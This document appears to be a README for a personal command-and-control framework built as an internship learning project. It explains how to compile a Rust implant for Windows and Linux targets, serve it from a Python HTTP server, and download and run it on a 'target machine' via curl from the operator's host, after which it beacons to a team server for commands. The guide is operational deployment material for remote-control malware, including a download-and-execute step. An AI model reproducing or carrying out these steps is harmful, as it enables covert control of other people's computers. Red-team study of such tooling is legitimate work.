# C2 Framework - Setup & Deployment Guide

## Overview

This C2 (Command & Control) framework consists of three components:

1. **Agent** (Rust) - Implant that runs on target machines
2. **Team Server** (Python) - Backend API and database
3. **Console** (React/Vite) - Web UI for command management

---

## Prerequisites

### On Your Local Machine (Windows)
- Node.js 20+
- PowerShell (for running commands)
- `curl` or `iwr` for downloading the agent

### On Your Linux Server (where Docker runs)
- Docker & Docker Compose
- Git (to clone/sync the repo)
- Rust toolchain (only if compiling the agent on Linux)

---

## 1. Generate TLS Certificate

The team-server communicates over HTTPS. Since this is a dev/test infra, we use a self-signed certificate.

```bash
mkdir -p certs
openssl req -x509 -newkey rsa:4096 -keyout certs/key.pem -out certs/cert.pem \
  -days 365 -nodes \
  -subj "/CN=TEAM_SERVER_IP" \
  -addext "subjectAltName=IP:TEAM_SERVER_IP"
```

Replace `TEAM_SERVER_IP` with your server's actual IP (e.g. `10.10.10.10`).

> The `certs/` directory is gitignored ^^.

---

## 2. Compile the Agent

### On Linux (Kali/Ubuntu) - For Windows Target

#### Install Dependencies
```bash
sudo apt update
sudo apt install pkg-config libssl-dev mingw-w64
rustup toolchain install stable
rustup default stable
rustup target add x86_64-pc-windows-gnu
```

#### Compile for Windows (from Linux)
```bash
cd ~/Documents/implants/C2/agent
BASE_URL=https://TEAM_SERVER_IP JITTER_MIN=3 JITTER_MAX=7 cargo build --target x86_64-pc-windows-gnu --release
```

The compiled binary will be at:
```
target/x86_64-pc-windows-gnu/release/agent.exe
```

#### Compile for Linux (from Linux)
```bash
cd ~/Documents/implants/C2/agent
BASE_URL=https://TEAM_SERVER_IP JITTER_MIN=3 JITTER_MAX=7 cargo build --release
```

The compiled binary will be at:
```
target/release/agent
```

### Environment Variables Explained
- **BASE_URL** - The team-server endpoint the agent will call (change `10.10.10.10` to your server IP)
- **JITTER_MIN** - Minimum seconds to wait between commands (default: 3)
- **JITTER_MAX** - Maximum seconds to wait between commands (default: 7)

---

## 3. Launch Docker Compose

### On Your Linux Server

#### Clone or Sync the Repository
```bash
cd ~/Documents/implants
git clone <repo> C2  # or git pull to update
cd C2
```

#### Build and Start All Services
```bash
docker compose build --no-cache
docker compose up -d
```

#### Verify Services are Running
```bash
docker compose ps
```

Expected output:
```
CONTAINER ID   IMAGE        COMMAND                  PORTS
xxx            c2-team-server    "uvicorn main:app..."   0.0.0.0:8000->8000/tcp
xxx            c2-console        "npm run dev..."        0.0.0.0:5173->5173/tcp
```

#### View Logs
```bash
# All services
docker compose logs -f

# Specific service
docker compose logs -f team-server
docker compose logs -f console
```

---

## 4. Configuration & Adaptation

### Change Server IP/Port

The agent hardcodes the `BASE_URL` at compile time. On my dev & test infra, I configured the TEAM_SERVER_IP to be reachable at 10.10.10.10.
If you need to change the C&C server address:

#### Option 1: Recompile with New URL
```bash
cd agent
BASE_URL=https://10.10.10.11 JITTER_MIN=3 JITTER_MAX=7 cargo build --target x86_64-pc-windows-gnu --release
```

#### Option 2: Use Environment Variable on Server
Edit `.env.example` in `agent/` directory and create `.env`:
```
BASE_URL=https://10.10.10.10
JITTER_MIN=3
JITTER_MAX=7
```

Then compile normally (it will read from `.env`).

### Change API Proxy in Console

If your team-server is on a different host/port, edit `console/vite.config.js`:

```javascript
server: {
  proxy: {
    '/api': {
      target: 'http://team-server:8000',  // Change this
      rewrite: path => path.replace(/^\/api/, '')
    },
    '/ws': {
      target: 'ws://team-server:8000',    // Change this
      ws: true,
      changeOrigin: true
    }
  }
}
```

Then rebuild:
```bash
docker compose build --no-cache console
docker compose up -d console
```

### Change Ports

Edit `docker-compose.yml`:
```yaml
services:
  team-server:
    ports:
      - "8000:8000"  # Change first port to expose on different port
  
  console:
    ports:
      - "5173:5173"  # Change first port to expose on different port
```

Then restart:
```bash
docker compose up -d
```

---

## 5. Host the Agent Binary

On your Linux server, host the compiled agent for download:

```bash
# Serve from the agent's target directory
cd ~/Documents/implants/C2/agent/target/x86_64-pc-windows-gnu/release
python3 -m http.server 8001
```

The agent will be available at: `http://10.10.10.10:8001/agent.exe`

---

## 6. Download and Execute Agent on Windows

On a Windows target machine:

```powershell

# Download agent
curl http://10.10.10.10:8001/agent.exe -OutFile agent.exe

# Execute
.\agent.exe
```

The agent will:
1. Connect to `BASE_URL` (hardcoded at compile time)
2. Register itself with the team-server
3. Poll for commands every 3-7 seconds (jitter)
4. Report results back to the console

---

## 7. Access the Console (Web UI)

Open your browser and navigate to:
```
http://10.10.10.10:5173
```

Or from your local machine if port-forwarded:
```
http://localhost:5173
```

No login required, the dashboard is open directly.

Note : This implant is reallyyyyyyy simple and part of my personnal learning process (final year internship project). Enjoy ;)

**Last Updated**: 2026-06-30
